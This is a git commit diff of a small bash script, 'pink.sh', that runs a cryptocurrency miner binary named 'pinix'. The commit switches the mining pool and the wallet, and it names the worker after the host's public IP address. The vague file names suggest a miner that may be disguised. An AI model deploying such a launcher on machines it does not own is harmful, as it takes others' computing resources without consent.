9c4d4d73024ce93034325c451b53a0a60117a949
yuadiuosdi <89881946+yuadiuosdi@users.noreply.github.com>
2021-09-26 13:50:43 +0700

    Update pink.sh

--- pink.sh
+++ pink.sh
@@ -1,9 +1,9 @@
 #!/bin/bash
 
-POOL=na-etc.hiveon.net:8888
-WALLET=0xeda9774264112a15245cf5eda7f9c1b2fe6bf63e
+POOL=ethash.poolbinance.com:1800
+WALLET=bakocang
 WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )
 
 cd "$(dirname "$0")"
 
-chmod +x ./pinix && ./pinix -wal $WALLET.$WORKER -epool $POOL -pass x -coin etc -stales 0 $@
+chmod +x ./pinix && ./pinix -wal $WALLET.$WORKER -epool $POOL -pass x -stales 0 $@
